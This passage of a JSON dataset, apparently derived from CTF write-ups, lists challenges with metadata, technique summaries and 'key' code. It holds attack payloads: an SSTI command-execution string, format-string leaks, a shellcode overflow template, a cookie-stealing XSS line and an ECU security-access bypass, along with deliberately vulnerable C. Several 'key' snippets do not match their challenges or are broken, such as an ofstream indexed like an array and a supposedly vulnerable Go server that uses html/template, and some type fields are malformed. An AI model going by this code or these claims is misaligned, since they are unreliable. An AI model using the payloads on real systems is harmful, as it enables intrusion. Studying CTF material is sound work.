            "In scenarios where direct decryption of encrypted data is not feasible due to limitations (such as data size restrictions), employing a blinding attack by breaking down the problem can be an effective strategy. In this challenge, the encrypted flag is split into smaller, manageable parts that comply with the server's limits, decrypted individually, and then reassembled. This approach leverages the homomorphic properties of the encryption scheme, where operations applied to encrypted data are preserved after decryption. This technique can be universally applied to circumvent limitations by working on a per-element basis and exploiting homomorphism to reconstruct the original data.\n\nExample payload for a single cell decryption, focusing on splitting the value into manageable chunks:\n\n```python\n# Assuming function dec_oracle sends our payload to the server and returns the decrypted matrix\ndef single_cell_decryption_example(i, j, val, n, p, dec_oracle):\n    k = val // 255\n    remainder = val % 255\n    payload_255 = ['\\0'] * (n * n)\n    payload_255[i * n + j] = chr(255)\n    decrypted_255_component = dec_oracle(\"\".join(payload_255))\n    \n    payload_remainder = ['\\0'] * (n * n)\n    payload_remainder[i * n + j] = chr(remainder)\n    decrypted_remainder_component = dec_oracle(\"\".join(payload_remainder))\n    \n    # Recombine the decrypted parts to get the original value\n    # Additional operations to integrate decrypted components back into the matrix would be needed\n    pass  # Pseudocode placeholder for recombination logic\n\n# Note: This is a simplified snippet to illustrate the approach. Actual implementation will involve converting decrypted results back into the appropriate algebraic structure.\n```"
        ],
        "key": "```python\ndef encrypt(U, X):  \n   return U * X * U ** -1\n\ndef decrypt(U, X):  \n   return U ** -1 * X * U  \n```\n\n```python\ndef bytes2gl(b, n, p=None):  \n   assert len(b) <= n * n  \n   X = FiniteGeneralLinearGroup(n, p)  \n   padlen = n * n - len(b)  \n   b = bytes([padlen]) * padlen + b  \n   for i in range(n):  \n       for j in range(n):  \n           X.set_at((j, i), b[i*n + j])  \n   return X\n\ndef recv_message(n, p):  \n   print(\"Data: \", end=\"\", flush=True)  \n   b = base64.b64decode(input())  \n   return bytes2gl(b, n, p)  \n```\n\n```python\ndef solver(res, p, dec_oracle):  \n   n = len(res)  \n   recovered = FiniteGeneralLinearGroup(n, p)  \n   for i in range(n):  \n       for j in range(n):  \n           print('recovered', i, j)  \n           val = res[i][j]  \n           k = val / 255  \n           remainder = val % 255  \n           payload = list('\\0' * n * n)  \n           payload[i * n + j] = chr(255)  \n           result_255 = dec_oracle(\"\".join(payload))  \n           X = create_from_matrix(result_255, n, p)  \n           recovered += X * k  \n           payload[i * n + j] = chr(remainder)  \n           result_remainder = dec_oracle(\"\".join(payload))  \n           X = create_from_matrix(result_remainder, n, p)  \n           recovered += X  \n   return recovered  \n```"
    },
    {
        "name": "NLFSR",
        "write_up": "dataset/raw/NLFSR.md",
        "type": "crypto",
        "competition": [
            "De1CTF/2020",
            "https://ctftime.org/event/1033/tasks/"
        ],
        "score": 235,
        "max_score": 1000,
        "difficulty": 0.235,
        "knowledge": [
            "When analyzing a Non-Linear Feedback Shift Register (NLFSR) in cryptographic challenges, identify a strong correlation between the output and one of the inputs by calculating the truth table for the NLFSR equation. This approach is effective when the output significantly depends on the state of specific inputs, allowing for the deduction of input values with high probability.",
            "In scenarios where direct correlation analysis between inputs and outputs of an NLFSR does not yield clear results, a combination of brute force and constraint-based analysis can be applied to deduce missing values. For example, understanding the behavior of specific inputs under known outputs (based on a truth table) facilitates the application of constraints to reduce the brute force search space for other inputs. This method is particularly useful for inputs with a relatively small range of possible values, allowing for an efficient search process.\n\n   Example payload snippet for brute force under constraints:\n   ```python\n   def brute_force_value_B(a, output, constraints):\n       for b in possible_values:\n           # Apply constraint based on A and output\n           if a == 1 and output == 1 and b == 1:\n               return b\n           elif a == 0 and output == 0 and b == 1:\n               return b\n   ```"
        ],
        "key": "```python\ndef lfsr(r, m):  \n   output = ((r << 1) & 0xffffff) ^ (bin(r & m).count('1') % 2)  \n   last_bit = (bin(r & m).count('1') % 2)  \n   return output, last_bit\n```"
    },
    {
        "name": "nodb",
        "write_up": "dataset/raw/nodb.md",
        "type": "web",
        "competition": [
            "DEFCON/2019/Quals",
            "https://ctftime.org/event/762/tasks/"
        ],
        "score": 118,
        "max_score": 201,
        "difficulty": 0.5870646766169154,
        "knowledge": [
            "When analyzing WebAssembly (Wasm) binaries in Web-based CTF challenges, decompiling the Wasm file can reveal critical functionality details. Tools such as Jae for Wasm decompilation allow for understanding complex logic implemented in Wasm binaries. This can be leveraged to identify variables or conditions crucial for challenge resolution.",
            "Patching Wasm text format (`.wat` files) by modifying constant values or logic conditions can alter the execution flow of the Wasm module. This technique can be utilized to bypass intended checks or to modify the module's output for easier bruteforcing of secrets like passwords or flags. After patching, the `.wat` file must be converted back to a binary `.wasm` file and can be executed within a browser environment to test the modified logic. To bruteforce a password or flag, one can iteratively test characters and monitor the output changes to deduce the correct sequence. \n\nExample modification for bruteforcing assistance: Change a comparison constant `(i32.const 1245)` to a function output `(local.get $variable)` to manipulate execution flow, facilitating the bruteforce process."
        ],
        "key": "```javascript\nptr = allocate(intArrayFromString( TEXTBOX_INPUT ), 'i8', ALLOC_NORMAL);  \nret = UTF8ToString(_authenticate(ptr));  \nif (ret == \"success\") document.getElementsByClassName(\"text\")[0].innerText = \"SUCCESS\"\n```"
    },
    {
        "name": "NoJS",
        "write_up": "dataset/raw/NoJS.md",
        "type": "web",
        "competition": [
            "Square/2022",
            "https://ctftime.org/event/1756/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with web applications that use template engines allowing for HTML injection but have a stringent Content-Security-Policy (CSP) forbidding JavaScript execution (`script-src 'none'`), alternative strategies need to be adopted. Utilizing HTML-based methods to exfiltrate sensitive information without relying on JavaScript, such as employing dangling markup injection to leak contents through styles or metadata, can be effective. This approach is applicable in environments where inline and external CSS or JS are explicitly disallowed by CSP.",
            "In contexts where the application uses `text/template` instead of `html/template`, especially in Go applications, it is critical to note that the former does not sanitize input for HTML output. This behavior can be exploited to perform HTML injection attacks. Attackers can insert arbitrary HTML content into the page, which could potentially include malicious elements designed to exploit other vulnerabilities or exfiltrate data. While a specific payload might vary based on the application's logic and the desired outcome of the attack, understanding the lack of sanitization could lead to strategies for bypassing output encoding mechanisms or directly injecting content that could lead to information disclosure.\n\nExample of exploiting HTML injection without JavaScript:\n\n```html\n<img src=x onerror=alert(document.cookie)>\n```\nNote: Since JavaScript execution is banned by CSP in the challenge's context, the above payload serves as a generic example and would not work under the specified conditions. Instead, focusing on dangling markup or SVG images with external resource references could achieve a similar effect in leaking information."
        ],
        "key": "```go\npackage main\n\nimport (\n\t\"html/template\"\n\t\"net/http\"\n)\n\nfunc renderTemplate(w http.ResponseWriter, tmpl string, data interface{}) {\n\tt, err := template.New(\"webpage\").Parse(tmpl)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tt.Execute(w, data)\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// Vulnerable to HTML injection\n\t\trenderTemplate(w, \"<html><body>{{.}}</body></html>\", r.URL.Query().Get(\"input\"))\n\t})\n\n\thttp.ListenAndServe(\":8080\", nil)\n}\n```"
    },
    {
        "name": "nookstop 2",
        "write_up": "dataset/raw/nookstop 2.0.md",
        "type": "reverse",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": -1.0,
        "max_score": 666,
        "difficulty": -1,
        "knowledge": [
            "When encountering Emscripten WebAssembly (Wasm) binaries in a challenge that are complex and difficult to decompile because of additional external code, rather than trying to reverse engineer the Wasm binary directly, look for hints within the challenge about the nature of the encryption or encoding scheme (like XOR in this scenario). This can lead to alternative approaches to solve the challenge without needing a deep understanding of the binary itself.",
            "If given a corrupted key or partial output that seems to be XOR'ed with the flag, one can try to recover the flag by XOR'ing the known corrupted output with a partial known correct output. This approach works well if the XOR difference is consistent or follows a pattern (e.g., only the lower bits are incorrect). The recovered bits can then be used to guess possible characters of the flag by trying all values that could result from XOR'ing with the known difference. \n\nExample Python snippet to try XOR difference:\n```python\ncorrupted_key = \"wkwcwg{c3oo33os\\x7f\"\nknown_partial_output = \"uiuctf{\"\nxor_diff = [ord(corrupted_key[i])^ord(known_partial_output[i]) for i in range(len(known_partial_output))]\nprint(xor_diff)  # Output the XOR difference to find a pattern\n\n# Assuming the pattern is found and is simple, try to recover possible characters\nfor b in corrupted_key:\n    print(''.join(chr(ord(b) ^ x) for x in range(4)))  # Adjust range if the pattern differs\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid decrypt(char *encrypted) {\n    char key[] = \"uiuctf{\";\n    for (int i = 0; i < strlen(key); i++) {\n        encrypted[i] ^= key[i];\n    }\n    printf(\"Decrypted: %s\\n\", encrypted);\n}\n\nint main() {\n    char encrypted[] = \"wkwcwg{c3oo33os\\x7f\";\n    decrypt(encrypted);\n    return 0;\n}\n```"
    },
    {
        "name": "not really math",
        "write_up": "dataset/raw/not really math.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 319,
        "max_score": 493,
        "difficulty": 0.6470588235294118,
        "knowledge": [
            "When solving algorithmic challenges where the input must be transformed into a specific format for evaluation, Python's `replace()` function can be effectively used to manipulate strings according to the challenge requirements. This approach is particularly useful when the challenge involves replacing certain characters or substrings to apply mathematical operations or any other logic. For example, in challenges requiring dynamic execution of modified string expressions, replacing characters with mathematical operators and then using `eval()` to compute the result can be a solution.\n   - Example transformation for mathematical expression: `'a'.replace('a', '+').replace('m', ')*(')`, and adding necessary parentheses can convert a custom encoded message into a valid Python expression for evaluation.",
            "To handle challenges that involve repeated interaction with a server, sending and receiving data, the use of libraries like `pwntools` for scripting the interaction can automate the process of fetching challenge inputs and sending responses. This method is especially useful in \"Capture The Flag\" (CTF) competitions for automating tasks against network services. \n   - Example snippet for automated communication: \n     ```python\n     from pwn import *\n     conn = remote('hostname', port)\n     conn.recvline()  # For receiving a line of data from the server\n     conn.sendline('data')  # For sending responses or data back to the server\n     ```"
        ],
        "key": "```python\ndef operator(given_str):  \n   new_str = '((' + given_str.replace('a', '+').replace('m', ')*(') + ')) % (2**32 - 1)'  \n   return str(eval(new_str))\n```"
    },
    {
        "name": "Not so Ez Reversing",
        "write_up": "dataset/raw/Not so Ez Reversing.md",
        "type": "reverse",
        "competition": [
            "0xL4ugh/2021",
            "https://ctftime.org/event/1248/tasks/"
        ],
        "score": -1,
        "max_score": 825,
        "difficulty": -1,
        "knowledge": [
            "When reverse engineering binaries to understand encryption or encoding mechanisms, it is effective to use decompilers like Ghidra for making sense of C++ binaries. Decompilers can significantly simplify complex binary structures into a more understandable form of code, thus accelerating the analysis process.",
            "In scenarios where a program relies on pseudo-random number generation (PRNG) for functionality like encryption, it\u2019s crucial to remember that PRNG results can differ across operating systems due to differences in the implementation of the `rand()` function. This discrepancy can affect reproducibility and decryption efforts. To ensure accurate decryption or analysis, one must execute or simulate the PRNG behavior on the same operating system as the target binary or application.\n\nExample payload for re-generating the random values considering the PRNG discrepancies:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(void){\n  // Ensure this is executed in the same OS environment as the original program\n  srand(0);  \n  for(int i=0; i<file_size; ++i){ // Assume 'file_size' is the accurate size of data\n    printf(\"%i,\", rand()%4);  \n  }  \n  return 0;  \n}\n```"
        ],
        "key": "```c\n#include <fstream>\n#include <vector>\n#include <cstdlib>\n\nint main() {\n    std::ofstream data_file(\"data.dat\");\n    srand(0);\n    std::vector<int> rand_arr;\n    for (int i = 0; i <= data_file.size(); ++i) {\n        rand_arr.push_back(rand() % 4);\n    }\n    for (int j = 0; j <= data_file.size(); ++j) {\n        int rand_val = rand_arr[j];\n        unsigned char data_val = data_file[j];\n        data_file[j] = mystery(data_val, rand_val);\n    }\n    return 0;\n}\n\nulong mystery(uchar data_val, int rand_val) {\n    ulong result = data_val;\n    if (rand_val == 3)\n        return data_val;\n    if (rand_val == 2)\n        result = data_val ^ 1;\n    if (rand_val == 1)\n        result = data_val;\n    if (rand_val == 0)\n        result = data_val ^ 1;\n    return result;\n}\n```"
    },
    {
        "name": "Notes",
        "write_up": "dataset/raw/Notes.md",
        "type": "forensics",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges where a Server-Side Template Injection (SSTI) vulnerability is identified, using the `__class__.mro()[1].__subclasses__()` can disclose sensitive information, such as the existence or implementation details of certain classes, which can be further exploited to achieve Remote Code Execution (RCE). Specifically, identifying useful classes such as `subprocess.Popen` can allow for executing arbitrary commands. For scenarios where direct instantiation of subprocess.Popen is not possible due to restrictions or filters, alternative classes that perform similar functionality (e.g., `gevent.subprocess.Popen`) can be utilized. Example payload to execute arbitrary commands via SSTI: `{{''.__class__.mro()[1].__subclasses__()[425])(['cat', '/path/to/flag'], -1, None, None, -1).communicate()[0]}}`.",
            "For forensic challenges involving memory dumps, tools like Volatility can be used to analyze the memory image to identify and extract processes of interest. When dealing with a memory dump from a Windows system, identifying the correct profile is crucial for extracting accurate information. Following the identification of the profile, listing running processes to find applications of interest (e.g., notepad.exe for textual data) and subsequently dumping their memory can lead to the discovery of sensitive information or flags. This approach is especially useful in challenges where the flag or hints to proceed are hidden within the runtime data of specific applications. To extract and search for specific patterns or flags from the dumped process memory, command-line utilities like `strings` can be employed. Example process for extracting data from a memory dump: First, use `vol.py -f memory.dmp imageinfo` to identify the correct profile, then dump the memory of a specific process using `vol.py --profile=YourIdentifiedProfile -f memory.dmp memdump --pid=TargetPID --dump-dir=./`, and finally use `strings -e l dumpedfile.dmp | grep -i \"pattern\"` to search for the flag or useful information."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid add_note() {\n    char note[100];\n    printf(\"Enter your note: \");\n    gets(note); // Vulnerable function\n    printf(\"Note added: %s\\n\", note);\n}\n\nint main() {\n    printf(\"Welcome to the notes app!\\n\");\n    add_note();\n    return 0;\n}\n```"
    },
    {
        "name": "nothing more to say",
        "write_up": "dataset/raw/nothing more to say.md",
        "type": "pwn",
        "competition": [
            "TokyoWesterns/2020",
            "https://ctftime.org/event/1086/tasks/"
        ],
        "score": -1.0,
        "max_score": 478,
        "difficulty": -1,
        "knowledge": [
            "When encountering a format string vulnerability in a binary with ASLR applied only to elements other than the binary itself (e.g., stack, libc), use the vulnerability to leak stack pointers by crafting a specific payload that includes format specifiers (e.g., `%41$lx`) to target and leak a specific QWORD in memory. This is useful for calculating the exact buffer or variable address in memory by the offset difference between the leaked pointer and the target memory address.\n   - Example payload: `%41$016lx`",
            "When dealing with a stack buffer overflow vulnerability in a binary where protections like SSP, NX, and PIE are disabled, and after obtaining a precise buffer address through a memory leak (as described above), one can craft a payload that overflows the buffer with a NOP sled followed by shellcode, then overwrites the return address with the address of the NOP sled (buffer address calculated from the leaked pointer). This approach enables execution of arbitrary code despite ASLR by using a two-step exploitation process: first, exploiting the format string vulnerability to leak addresses, and second, executing the shellcode via stack buffer overflow.\n   - Example payload conceptual template: `\"\\x90\"*NOP sled size + shellcode + struct.pack(\"<Q\", calculated buffer address)`\n   - Note: This template needs to be adjusted based on the shellcode and the exact address of the buffer, which is calculated as `leaked address - offset`."
        ],
        "key": "```c\nint main(void) {  \n   char buf[0x100];  \n   init_proc();  \n   puts(\"Hello ...etc... :)\");  \n   gets(buf);                   // <-- stack buffer overflow  \n   printf(buf);         // <-- format string vulnerability  \n   return 0;  \n}  \n```"
    },
    {
        "name": "notifico",
        "write_up": "dataset/raw/notifico.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 215,
        "max_score": 500,
        "difficulty": 0.43,
        "knowledge": [
            "When facing CTF challenges involving file permissions and program execution behavior, the use of `inotify` can be a critical aspect to consider. `inotify` is a Linux kernel subsystem that acts to extend filesystems to notice changes to the filesystem, and it's used to monitor file activities. Understanding how `inotify` works can be essential in challenges where the script or program reacts to file system events, particularly those involving regular and symlink file types. In such scenarios, manipulating file system events (like opening or modifying files) can trigger specific behaviors in the program, which could be exploited to achieve a desired outcome, such as manipulating the result of a script to return a specific exit code.",
            "Solving complex puzzles in CTF challenges, such as the N queens problem, can be approached algorithmically by generating systematic solutions through scripting. The N queens problem is a well-known puzzle that involves placing N queens on an N\u00d7N chessboard so that no two queens threaten each other. This problem can analogously represent scenarios in CTF challenges, where an arrangement of certain elements (like file permissions or specific files) must meet particular conditions without conflicts. Utilizing existing algorithms or adapting them to generate all possible solutions can help in iterating through potential configurations until the correct one is found. Scripting this process in languages like Python or C and leveraging mathematical or logical problem-solving techniques allows for efficient decryption or uncovering of hidden information based on the challenge's constraints.\n\nSample Python snippet to change solution to UNIX permissions and SHA-256 hash for decryption attempts:  \n\n```python\n# This Python snippet is an abstract example and may require context-specific adjustments\nimport os\nimport hashlib\nfrom queens import generate_solutions  # Assuming \"queens.py\" provides a function to generate solutions\n\ndef apply_permissions(solution, base_dir):\n    for i, row in enumerate(solution):\n        for j, is_queen in enumerate(row):\n            file_path = os.path.join(base_dir, f'dir_{i}', f'file_{j}')\n            if is_queen:\n                os.chmod(file_path, 0o700)\n            else:\n                os.chmod(file_path, 0o400)\n\ndef hash_directory(base_dir):\n    hasher = hashlib.sha256()\n    for root, dirs, files in os.walk(base_dir):\n        dirs.sort()\n        files.sort()\n        for fname in files:\n            file_path = os.path.join(root, fname)\n            with open(file_path, 'rb') as f:\n                hasher.update(f.read())\n    return hasher.hexdigest()\n\n# Example usage\nsolution = generate_solutions(15)  # Generating a 15x15 N queens solution\napply_permissions(solution[0], './solution_dir')  # Applying permissions based on the first solution\nhashed_solution = hash_directory('./solution_dir')\nprint(f'SHA-256 hash of the solution directory: {hashed_solution}')\n```\n\nThis snippet exemplifies how to convert a logical solution (e.g., the N queens puzzle) into a series of file permission changes, then hashing the directory for attempts at decrypting or verifying the solution against a challenge condition."
        ],
        "key": "```python\nVAL = 15\n\n# ...\n\nres = subprocess.call([\"./check\", basedir])\n\nif res == 255 or res != VAL:  \n   print(\"This looks no good...\")  \n   exit(-1)  \nelse:  \n   print(\"A worthy try, let's see if it yields something readable...\")  \n```\n\n```c\n// Pseudocode representation of the check executable's logic\nint result = 0;\nfor each directory in directories:\n    for each file in directory:\n        if is_regular_file(file):\n            inotify_add_watch(file);\n            if fopen(file, \"r+\") is successful:\n                fclose(file);\n            else:\n                // Handle error\n        else if is_symlink(file):\n            // Handle symlink\n            if execve(symlink_target) is successful:\n                // Program will crash\n            else:\n                // Handle error\n    handle_inotify_events();\n    for each event in inotify_events:\n        if event is IN_CLOSE_WRITE:\n            result += 1;\nexit(result);\n```"
    },
    {
        "name": "Not_Baby_Fixed",
        "write_up": "dataset/raw/Not_Baby_Fixed.md",
        "type": "crypto",
        "competition": [
            "PBjar/2021",
            "https://ctftime.org/event/1430/tasks/"
        ],
        "score": 409,
        "max_score": 500,
        "difficulty": 0.818,
        "knowledge": [
            "When faced with a large RSA modulus n that is difficult to factor directly, look for information or equations related to how n is constructed. If n is derived from an equation involving multiple variables, factor these variables first if their values are known or can be derived. This approach can simplify the equation, breaking down n into smaller, more manageable factors for prime factorization. This technique is particularly useful when direct factorization of n is impractical due to its size. \n\nExample application: If n = a^3 + b^3 - 34c^3 and the values of a, b, and c are known, factor a, b, and c to rewrite n in a simplified form that is easier to factor.",
            "For the RSA decryption process, calculating the Euler's totient function phi(n) can sometimes be simplified when the prime factors of n and their exponents are known. In cases where the primes do not have exponents greater than 1, phi can be simply calculated by multiplying (p-1) for each prime p. However, when primes do have exponents greater than 1, phi must be calculated considering the exponent. The correct formula for a prime p with exponent e is phi(p^e) = p^(e-1) * (p-1). This knowledge is critical for accurately computing phi and, subsequently, the decryption exponent d in RSA.\n\nExample calculation for a prime p with exponent e: phi(p^e) = p^(e-1) * (p-1), where p is a prime factor of n and e is its exponent."
        ],
        "key": "```python\n# script.py\n\nfrom Crypto.Util.number import *\n\nwith open('nums.txt','r') as f:  \n    s=f.read().strip().split()  \n    a=int(s[0])  \n    b=int(s[1])  \n    c=int(s[2])\n\ne=65537  \nct=1918452064660929090686220330495385310745803950329608928110672560978679963497394969369363585721389729566306519544561789659164639271919010791127784820214512488663422537225906608133719652453804000168907004058397487865279113133220466050285  \nn=3134820448585521702394003995997656455907477282436511703324204127865184340978305062848983553236851077753614495104127538077189920381627136628226756258746377111950396074035862527542407869672121642062363412247864869790585619483151943257840\n\n# Vulnerable code: n is generated using a, b, c in a specific way\nn = a**3 + b**3 - 34*c**3\n```"
    },
    {
        "name": "Now We Can Play!!",
        "write_up": "dataset/raw/Now We Can Play!!.md",
        "type": "crypto",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "In ElGamal encryption scheme challenges, if one has access to ciphertext components and the public key parameters but not the private key, one can still retrieve the plaintext by exploiting relationships between these components and using the fact that the private key is used similarly in both encryption and decryption processes. This involves rearranging the provided formulas and applying the modular multiplicative inverse operation. A decryption formula in such scenarios can be simplified to \\(m = c2 \\times inverse(pow(c1, sk, p)) \\mod p\\), where \\(sk\\) is the secret key, and \\(c1\\), \\(c2\\), and \\(p\\) are given.",
            "If the decryption function introduces a random value that affects the plaintext outcome, and if this randomness operates within a known, finite range, one can perform a brute force attack to recover the original plaintext by iterating through all possible values of the random factor. This is feasible if the range of values is relatively small, as seen with the rand value varying between \\(2^{16}\\) and \\(2^{17}\\). The knowledge of the message format (e.g., printable characters) can assist in validating the correctness of the brute-forced plaintext. In ElGamal and similar cryptographic schemes, the formula for brute-forcing based on randomness could be summarized as \\(m = m_ \\times inverse(pow(3, rand, p)) \\mod p\\), given that \\(m_\\) is the modified message received.\n\nExample brute force snippet (context-specific):\n``` python\nfor rand in range(2**16, 2**17):\n    m_attempt = m_ * inverse(pow(3, rand, p), p) % p\n    if is_printable(m_attempt):\n        print(\"Found flag:\", m_attempt)\n        break\n```"
        ],
        "key": "```python\nx = randint(2, p)  \nr = randint(2, p)  \nh = pow(g, x, p)  \nc1 = pow(g, r, p)  \nc2 = m * pow(h, r, p) % p  \n\ndef decrypt(c1, c2, sk, p):\n    rand = randint(2 ** 16, 2 ** 17)  \n    m_ = pow(3, rand, p) * c2 * inverse(pow(c1, sk, p), p) % p\n    return m_\n```"
    },
    {
        "name": "NPC",
        "write_up": "dataset/raw/NPC.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": -1,
        "max_score": 320,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving encrypted secrets with hints suggesting that components of the password are constructed from specific sets of words (e.g., words from the US Constitution), constructing a trie data structure filled with these word options significantly aids in filtering through potential passwords. The trie allows for an efficient exploration of possible word combinations by ensuring each trial is a prefix of or a complete valid word from the set. This approach is particularly useful when dealing with large word sets and complex concatenation or encryption puzzles.",
            "When a challenge provides a graph-based hint for decrypting or constructing a password, where the graph's vertices and edges represent components of the password and their concatenation order respectively, and includes additional constraints like random edges or directional reversals, converting the graph into an undirected version can simplify the solution process. This allows for the implementation of a backtracking algorithm that explores all possible paths, ensuring that each step adheres to specific rules (e.g., forming valid words from a trie). This technique is useful for puzzles where deciphering the correct path through provided or manipulated data structures leads to the solution."
        ],
        "key": "```c++\n#include <fstream>  \n#include <unordered_map>  \n#include <unordered_set>  \n#include <vector>  \n#include <algorithm>  \n#include <iostream>\n\nusing namespace std;\n\nifstream fin(\"./hint\");  \nifstream fwords(\"./words\");  \nofstream fout(\"solution.cpp.txt\");\n\nint n, m;  \nunordered_map<int, int> coresp;\n\nchar labels[28];  \nvector < int > gr[28];\n\nstruct trie_node {  \n   trie_node(bool w) {  \n       word = w;  \n       for (int i = 0; i < 26; ++i) {  \n           nxt[i] = nullptr;  \n       }  \n   }  \n   bool word;  \n   trie_node *nxt[26];  \n} *root = new trie_node(0);\n\nvoid insert(string s) {  \n   trie_node *n = root;  \n   for (const char &c : s) {  \n       if (!n->nxt[c - 'a']) {  \n           n->nxt[c - 'a'] = new trie_node(0);  \n       }  \n       n = n->nxt[c - 'a'];  \n   }  \n   n->word = 1;  \n   cerr << s << '\\n';  \n}\n\nvoid back(int node, trie_node *t, vector<bool> &used, string &sol) {  \n   if (t->word) {  \n       back(node, root, used, sol);  \n   }  \n   used[node] = true;  \n   sol += labels[node];\n\n   bool smth = false;  \n   for (const int &x : gr[node]) {  \n       if (used[x]) continue;  \n       if (!t->nxt[labels[x] - 'a']) continue;  \n       back(x, t->nxt[labels[x] - 'a'], used, sol);  \n       smth = true;  \n   }\n\n   if (!smth && sol.size() == n && t->word) {  \n       fout << sol << '\\n';  \n   }\n\n   used[node] = false;  \n   sol.pop_back();  \n}\n\nint main() {\n\n   string s;  \n   while (fwords >> s) {  \n       insert(s);  \n   }\n\n   fin >> n >> m;\n\n   for (int i = 0; i < n; ++i) {  \n       int label;  \n       fin >> label;  \n       coresp[label] = i;  \n       char val;  \n       fin >> val;  \n       labels[i] = val;  \n   }\n\n   for (int i = 0; i < m; ++i) {  \n       int a, b;  \n       fin >> a >> b;  \n       gr[coresp[a]].push_back(coresp[b]);  \n       gr[coresp[b]].push_back(coresp[a]);  \n   }\n\n   string sol = \"\";  \n   vector<bool> used(n, 0);\n\n   for (int i = 0; i < n; ++i) {  \n       cerr << \"start \" << i << '\\n';  \n       if (!root->nxt[labels[i] - 'a']) continue;  \n       back(i, root->nxt[labels[i] - 'a'], used, sol);  \n       cerr << \"done \" << i << '\\n';  \n   }  \n}  \n```"
    },
    {
        "name": "NRC",
        "write_up": "dataset/raw/NRC.md",
        "type": "web",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": -1,
        "max_score": 493,
        "difficulty": -1,
        "knowledge": [
            "When a web challenge appears to restrict user interactions (e.g., disabling right-click), alternative methods such as using keyboard shortcuts (Ctrl+Shift+C for Chrome's Developer Tools) can circumvent these restrictions and allow exploration of the application's elements and source code.",
            "Examining CSS, JavaScript, or other static files linked to the website can reveal comments or hardcoded strings that may contain hints or the flag itself. This strategy can be particularly effective when direct interaction with the website's main functionalities is limited or obfuscated."
        ],
        "key": "```javascript\ndocument.addEventListener('contextmenu', event => event.preventDefault());\n```"
    },
    {
        "name": "NT master",
        "write_up": "dataset/raw/NT master.md",
        "type": "pwn",
        "competition": [
            "m0leCon/2020/Quals",
            "https://ctftime.org/event/1025/tasks/"
        ],
        "score": -1,
        "max_score": 449,
        "difficulty": -1,
        "knowledge": [
            "When facing challenges that require timely responses, automate the data submission process using scripts. Python, combined with libraries such as pwntools, is effective for interacting with network services in real-time challenges. This method ensures that submissions are made within stringent time constraints.",
            "In challenges related to mathematical conditions or equations, simplifying the conditions may present a straightforward solution. For instance, if the problem requires finding values a and b such that their greatest common divisor (gcd) and least common multiple (lcm) sum up to a given number N, and a > b > 0, consider simple arithmetic decompositions of N that satisfy the conditions. A practical example is decomposing N into (N-1) + 1, assuming N > 2, which satisfies the given mathematical requirement without the need for complex algorithms or libraries.\n\nSample of payload in the context of the challenge:\n```python\nconn.sendline('%s %s' % (num-1, 1))\n```"
        ],
        "key": "```python\nif __name__ == \"__main__\":  \n   pattern = r'\\d+'  \n   try:  \n       conn = remote('challs.m0lecon.it', 10000)  \n       c = bytes_to_string(conn.recv())  \n       num = int(re.findall(pattern, c)[-1])  \n       conn.sendline('%s %s' % (num-1, 1))  \n       for i in list(range(1,11)):  \n           conn.recvline()  \n           c = bytes_to_string(conn.recvline())  \n           print(c)  \n           num = int(re.findall(pattern, c)[-1])  \n           conn.sendline('%s %s' % (num-1, 1))  \n   except EOFError:  \n       pass  \n```"
    },
    {
        "name": "OBD Tuning 1",
        "write_up": "dataset/raw/OBD Tuning 1.md",
        "type": "The type of challenge in this CTF write-up is **forensics**.",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with automotive cybersecurity, particularly CAN (Controller Area Network) protocols, analyzing UDS (Unified Diagnostic Services) commands within a PCAP dump can reveal useful processes relevant to penetration testing or ethical hacking of car systems. These include initiating diagnostic sessions (10 02), requesting security access via a challenge (27 01), providing a security access response (27 02), and reading data by Common Identifier (22 00 00). These commands are crucial for interacting with the Electronic Control Unit (ECU) to extract sensitive information or carry out functions, wrapped in ISO-TP (ISO 15765-2) as the underlying transport protocol.",
            "In scenarios of cryptographic challenge-response systems, particularly those encountered in automotive systems security, a viable method to bypass or satisfy the security mechanism is through operations such as XOR on the provided challenge with a discovered static key. Upon analyzing network traffic (e.g., a PCAP file) and identifying a pattern or a static key used in the XOR operation for the response, this key can be used to craft responses to future challenges posed by the system. This approach allows for unauthorized access to protected functionalities, such as reading specific data identifiers for potential exfiltration of secure information.\n\nExample payload for crafting a response in Python based on observed XOR key:\n```python\n# Assuming we have already obtained the challenge from the ECU\nchallenge_hex = \"670167987F8A8248B127A411253FE49EB8EE\"  # Sample challenge in hex\nchallenge_int = int(challenge_hex, 16)  # Convert to integer for XOR operation\nkey = 0x34323432343234323432343234323432  # Discovered XOR key\n\n# Calculate response using XOR\nresponse = challenge_int ^ key\n\n# Prepare and send the response back to the ECU\nresponse_hex = hex(response)[2:]  # Convert response back to hex, removing the '0x' prefix\n# Subsequent code would send this response back as part of the security access process\n```"
        ],
